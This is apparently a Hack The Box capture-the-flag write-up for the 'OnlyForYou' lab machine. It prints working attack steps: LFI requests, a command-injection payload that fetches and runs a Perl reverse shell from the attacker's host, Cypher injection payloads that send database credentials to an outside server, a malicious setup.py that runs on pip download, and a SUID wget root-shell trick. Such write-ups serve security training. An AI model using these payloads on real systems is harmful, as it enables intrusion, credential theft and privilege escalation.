# OnlyForYou - HTB(Medium)
## IP = 10.10.11.210

### NMAP

```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://only4you.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Enumeration

So after enumerating the main site I got bored and didn't find anything, so I tried a couple of tools, I tried `ffuf` to enumerate for subdomains to see if there is any other data hidden from us. 

```

$ ffuf -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt -u http://only4you.htb/ -H "Host: FUZZ.only4you.htb" -mc all -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://only4you.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.only4you.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

[Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 144ms]
    * FUZZ: beta

```

Great so we found, a subdomain called `beta` lets add it to our `/etc/hosts` and run it in the browser.

As soon it we open it up in the browser there is a button, if you click it you can download the source code for this site. After downloading the source and analyizing it a little bit, I stumbled upon a function called `download`:

```

@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image)
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)

```

This function is called when the `/download` directory is set in the url. So lets analyze it:

first we get a request parameter called image then we take that image and we normilize its path to a variable called `filename` after that there are a couple of `if` statements to check:
1. check if that file name includes the `..` or begins with `../` this type of check is done to prevent malicious attacks like LFI. 
2. check if the path is not absolute, if it's not then it will join it to the path of the list folder.
3. the third and final check is if the filename is a real file, if it is then it will download the specified file.

We can get LFI from this function. This is because the `send_file` function returned from `download` is not sanatized, if we enter any sort of file that exists in the file system, use it's absolute path and don't use and sort of dots(`..` or `../`) then it will send that file to be downloaded.

it's very easy and it goes like this:

```

$ curl -s http://beta.only4you.htb/download --data "image=/etc/passwd" | grep "bash"
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:john:/home/john:/bin/bash
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash

```

So I started to search for interesting information and I found:
I wanted to get to the webroot but I didn't know whats the webroot directory name so I thought to myself I know that we're running on nginx so I searched for interesting stuff there, and found:

```

$ curl -s http://beta.only4you.htb/download --data "image=/var/log/nginx/error.log
2023/04/28 13:25:55 [error] 1046#1046: *1433884 upstream prematurely closed connection while reading response header from upstream, client: 10.10.16.76, server: only4you.htb, request: "POST / HTTP/1.1", upstream: "http://unix:/var/www/only4you.htb/only4you.sock:/", host: "only4you.htb"

```
And here we can see the /var/www/only4you.htb webroot directroy. Thats great, know we can check out app.py:

```

from form import sendmessage

@app.route('/', methods=['GET', 'POST'])                                                                                                      
def index():                                                                                                                                  
    if request.method == 'POST':                                                                                                              
        email = request.form['email']                                                                                                         
        subject = request.form['subject']                                                                                                     
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

```
This is the interesting thing from `app.py` this `index` function seems to send an email and check it's status, but we don't know how it's sending the email because it's using a self created function called `sendmessage` and we don't know how it operates. We can see in the imports section the following `from form import sendmessage` so probably there is a file called `form.py` containing the function `sendmessage` and there is.
 
But I didn't find the `form.py` file like that, me and my stupidity, I didn't think about the import part so I took the hard way, and created a flask server the requests the `curl` command we do for the lfi, then whichever directory I specify in the server it would output it in the browser so then I can run `gobuster` as if we're searching for hidden directories but it's automated lfi. This is the script I used:

```

from flask import Flask, abort
import requests

app = Flask(__name__)

@app.route('/<path:directory>')
def process_directory(directory):
    # Perform the HTTP request using the given directory
    url = 'http://beta.only4you.htb/download'
    payload = {'image': f'/var/www/only4you.htb/{directory}'}
    response = requests.post(url, data=payload, allow_redirects=False)
    
    # Check if the response contains a 302 status code or a Content-Length of 197
    if response.status_code == 302 or response.headers.get('Content-Length') == '197':
        # Log an error message
        logging.error(f"HTTP request for directory '{directory}' returned a 302 status code or a Content-Length of 197")
        
        # Return a 404 status code
        return "Page not found", 404
    
    # Return the response content as plain text
    return response.text

if __name__ == '__main__':
    app.run()

```
Then ran the app, `python3 app.py` I used the following `gobuster` command:

```

$ gobuster dir -u http://localhost:5000/ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -x py --exclude-length 265
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          265
[+] User Agent:              gobuster/3.5
[+] Extensions:              py
[+] Timeout:                 10s
===============================================================
2023/04/28 10:14:59 Starting gobuster in directory enumeration mode
===============================================================
/form.py              (Status: 200) [Size: 2025]
/app.py               (Status: 200) [Size: 1297]

```
And found the `form.py` file like that. 

So back to business, `form.py`:

```

import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
        if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
                return 0
        else:
                domain = email.split("@", 1)[1]
                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
                output = result.stdout.decode('utf-8')
                if "v=spf1" not in output:
                        return 1
                else:
                        domains = []
                        ips = []
                        if "include:" in output:
                                dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
                                dms.pop(0)
                                for domain in dms:
                                        domains.append(domain)
                                while True:
                                        for domain in domains:
                                                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
                                                output = result.stdout.decode('utf-8')
                                                if "include:" in output:
                                                        dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
                                                        domains.clear()
                                                        for domain in dms:
                                                                domains.append(domain)
                                                elif "ip4:" in output:
                                                        ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
                                                        ipaddresses.pop(0)
                                                        for i in ipaddresses:
                                                                ips.append(i)
                                                else:
                                                        pass
                                        break
                        elif "ip4" in output:
                                ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
                                ipaddresses.pop(0)
                                for i in ipaddresses:
                                        ips.append(i)
                        else:
                                return 1
                for i in ips:
                        if ip == i:
                                return 2
                        elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
                                return 2
                        else:
                                return 1

def sendmessage(email, subject, message, ip):
        status = issecure(email, ip)
        if status == 2:
                msg = EmailMessage()
                msg['From'] = f'{email}'
                msg['To'] = 'info@only4you.htb'
                msg['Subject'] = f'{subject}'
                msg['Message'] = f'{message}'

                smtp = smtplib.SMTP(host='localhost', port=25)
                smtp.send_message(msg)
                smtp.quit()
                return status
        elif status == 1:
                return status
        else:
                return status

``` 

As you can see after a little of analyzing we can see the following lines:

```

domain = email.split("@", 1)[1]
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)

```

As you can see in the `result` line it is calling a function called `run` this function is from the `subprocess` module it runs a system command. We can see in the line above the `domain` variable the is split from the email we specify, meaning what ever comes after the **@** is going to the `domain` variable. The command run is not important to us, because we can do what ever command we want. By inserting after the email a semicolomn(**;**) we can run what ever command we want. This is how you do it:

1. First you want to open up burpsuite, and intercept the "contact" form
2. After interception you would see the following request:

```

POST / HTTP/1.1
Host: only4you.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://only4you.htb
Connection: close
Referer: http://only4you.htb/
Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiWW91IGFyZSBub3QgYXV0aG9yaXplZCEiXX1dfQ.ZE1Snw.ytNdl-QrMRFTscdZtZcEJFdg9c4
Upgrade-Insecure-Requests: 1

name=bla&email=fad3%40gmail.com&subject=lsla&message=hello

```

3. We want to inject our command in the system, to do that you want to add that semicolumn after the domain and then your command as follows:

```

name=bla&email=itay%40gmail.com%3bcurl+http%3a//10.10.14.133/perl-reverse-shell.pl+-o+/dev/shm/perl-reverse-shell.pl&subject=lsla&message=hello

``` 
As you can see I'm adding a perl reverse shell to the system so after I follow the request I'll do another one and execute it.

```

name=bla&email=itay%40gmail.com%3bperl+/dev/shm/perl-reverse-shell.pl&subject=lsla&message=hello

```
**Note: don't forget to open an http server before running those two commmands and a netcat listener.**

And Boom! we got ourselfs a shell:

```

$ nc -lvnp 9998
listening on [any] 9998 ...
connect to [10.10.14.120] from (UNKNOWN) [10.10.11.210] 41416
 16:37:52 up 1 min,  0 users,  load average: 0.83, 0.48, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
Linux only4you 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/
/usr/sbin/apache: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@only4you:/$ 

```

Great so now we got a shell. Lets start enumerating. 

### Port Forwarding

As I enumerated the machine I saw three ports that I didn't see with my nmap:

```

www-data@only4you:/$ netstat -tunlp | grep "LISTEN"
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1038/nginx: worker
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -

```
The ports are 7474, 3000, 8001. Ok so 3000 and 8001 are a multiple service port so we don't know what it's for but 7474 is interesting after a little googling I managed to find the port 7474 is the neo4j brower http port, so lets forward all 3 and see what's interesting.

To do so I uploaded `chisel` to the shell chisel is a tool for tunneling which is exactly what we need.

First create the server on your host machine:
```

$ ./chisel server -p 7777 --reverse
2023/05/02 13:03:42 server: Reverse tunnelling enabled
2023/05/02 13:03:42 server: Fingerprint TyYDrdALE7b96tot0xX/Wzeb6Dyn/dzVETaX9YVJs8U=
2023/05/02 13:03:42 server: Listening on http://0.0.0.0:7777

```

Second use chisel on the target ports:
```

www-data@only4you:/tmp$ ./chisel client 10.10.14.120:7777 R:7474:localhost:7474 R:3000:localhost:3000 R:8001:localhost:8001

(Host)$ ./chisel server -p 7777 --reverse
2023/05/02 13:03:42 server: Reverse tunnelling enabled
2023/05/02 13:03:42 server: Fingerprint TyYDrdALE7b96tot0xX/Wzeb6Dyn/dzVETaX9YVJs8U=
2023/05/02 13:03:42 server: Listening on http://0.0.0.0:7777
2023/05/02 13:03:48 server: session#1: tun: proxy#R:8090=>localhost:7474: Listening
2023/05/02 13:15:30 server: session#2: tun: proxy#R:7474=>localhost:7474: Listening
2023/05/02 13:15:30 server: session#2: tun: proxy#R:3000=>localhost:3000: Listening
2023/05/02 13:15:30 server: session#2: tun: proxy#R:8001=>localhost:8001: Listening

```

Great we reverse port forwarded these ports now access them.

Starting with 3000

#### 3000

Looking at the site we can see a login form, if we try some default credentials like `admin:admin` and it worked we're logged in as admin over there we got a `/employees` directory, lets navigate to there. In the `/employees` we got a search user functionality. If you think of how this works is fairly simple, just takes the search parameter's input and looks for it at the database, we know for a fact that the database is neo4j so maybe there is a SQL injection vulnerability. We got to remember, that neo4j is not the standard SQL language, but the queries are from a language called Cypher. So we probably got to search for Cypher injection. So I read a little bit and found some payload, so I tried.


```

(Host)$ sudo python3 -m http.server 80 # we're creating a http server because the data from the neo4j DB is gonna be send to us as a http GET request

```
After running the http server I started with the first payload. Note: I pasted it stright to the input box if I didn't it wouldn't work.

First payload for getting Neo4j version:
In all payloads don't forget to replace the host ip.
```
' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.0.1/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```
Output:
```

$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.210 - - [02/May/2023 14:40:59] code 400, message Bad request syntax ('GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1')
10.10.11.210 - - [02/May/2023 14:40:59] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -

```
Boom! it works, thats fantastic, now some more info.

Second get lables:
```
' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.0.0.1/?label='+label as l RETURN 0 as _0 //
```
Output:

```

10.10.11.210 - - [02/May/2023 14:43:00] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:43:00] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:43:00] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:43:00] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:43:01] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:43:01] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:43:01] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:43:01] "GET /?label=employee HTTP/1.1" 200 -

```
Ok we got user and employee. user looks more interesting.

Third get properties of user:
```
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.0.1/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```
Output:

```

10.10.11.210 - - [02/May/2023 14:44:19] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:20] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:20] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:20] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:20] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:20] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:21] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:21] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:21] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:21] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:22] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:22] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [02/May/2023 14:44:22] "GET /?username=john HTTP/1.1" 200 -

```
And we got two users, the first admin, second john. Lets try and crack those hashes. Always before I go to hash cat I got the a site called https://crackstation.net/ it's a great hash crack and it's way faster you it's an easy hash. So I added those to passwords and found:

john:8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918:admin
admin:a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You

let's try and login:

### SSH Login

```

$ ssh john@10.10.11.210
password: ThisIs4You

john@only4you:~$ cat user.txt
d6782e04de7b270fcb14d452171edfff

```
And we got the user.txt


### PrivEsc

So by running `sudo -l` we can see the following:

```

john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz

```
We can run `pip3 download` as root, let's check for common exploits. Found one, seems that we can create a malicious package that will execute right when download is called and this will lead to arbitrary code execution.

It goes as follows:

```

(Host)$ cd /dev/shm/
(Host)$ mkdir exploitpy
(Host)$ cd exploitpy/
(Host)$ touch setup.py
(Host)$ mkdir src
(Host)$ touch src/__init__.py
(Host)$ echo 'print("Hello, World!")' > src/main.py

```
Inside setup.py:

```

#setup.py
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

def RunCommand():
        # Arbitrary code here!
        import os;os.system("chmod u+s /usr/bin/wget")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "exploitpy",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)

```

```
(Host)$ pip3 install setuptools
(Host)$ pip3 install build

(Host)$ python3 -m build

```
Credit: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/

After building you'll get a `exploitpy-0.0.1.tar.gz` file you want to upload it to localhost port 3000, but wait we don't know what's over there so let's find out. If you're still running that chisel session you can run it on your browser and see a Gogs which is a git service, so I logged in with john's creds and tried to upload it from there but it didn't work, so I thought of another idea use the git commad to upload it and thats how I did it:

```

john@only4you:/dev/shm$ git clone http://127.0.0.1:3000/john/Test.git
john@only4you:/dev/shm$ cd Test
john@only4you:/dev/shm/Test$ wget http://10.10.14.120/exploitpy-0.0.1.tar.gz
john@only4you:/dev/shm/Test$ git status
On branch master
Your branch is up to date with 'origin/master'.

Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   exploitpy-0.0.1.tar.gz

john@only4you:/dev/shm/Test$ git config --global user.name "john"
john@only4you:/dev/shm/Test$ git config --global user.email "john@only4you.htb"
john@only4you:/dev/shm/Test$ git commit -m "Update"
[master 328d708] Update
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 exploitpy-0.0.1.tar.gz
john@only4you:/dev/shm/Test$ git push
Username for 'http://127.0.0.1:3000': john
Password for 'http://john@127.0.0.1:3000': 
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 1.27 KiB | 1.27 MiB/s, done.
Total 3 (delta 0), reused 0 (delta 0)
To http://127.0.0.1:3000/john/Test.git 
   cfb1ab6..328d708  master -> master

```

Great now it's just a matter of:

```

john@only4you:/dev/shm/Test$ sudo /usr/bin/pip3 download http\://127.0.0.1\:3000/john/Test/src/master/exploitpy-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/Test/src/master/exploitpy-0.0.1.tar.gz
  File was already downloaded /dev/shm/Test/exploitpy-0.0.1.tar.gz
Successfully downloaded exploitpy

```

#### Getting Root
```

john@only4you:/dev/shm/Test$ TF=$(mktemp)
john@only4you:/dev/shm/Test$ chmod +x $TF
john@only4you:/dev/shm/Test$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
john@only4you:/dev/shm/Test$ /usr/bin/wget --use-askpass=$TF 0
# bash -p
bash-5.0# cat /root/root.txt 
ae6e52594bc580f2cf00c3139f13b841

```

And that's it, thanks for tuning in that was a hard one espacially the user part. Cheers.
